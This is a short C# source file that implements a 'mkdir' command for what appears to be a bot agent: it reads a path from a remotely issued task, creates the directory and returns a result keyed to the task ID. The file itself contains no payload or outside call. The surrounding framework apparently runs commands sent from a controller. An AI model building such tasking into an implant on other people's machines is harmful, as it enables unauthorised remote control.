using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class CreateDirectory : BotCommand
    {
        public override string TaskName => "mkdir";

        public override BotTaskResult RunTask(BotTask task)
        {
            string path;
            var arguments = task.Arguments.Split(' ');
            if (arguments is null || arguments.Length == 0)
            {
                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = "No path provided"
                };
            }
            else
            {
                path = arguments[0];
            }

            var dirInfo = Directory.CreateDirectory(path);
            
            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = $"{dirInfo.FullName} created"
            };
        }
    }
}
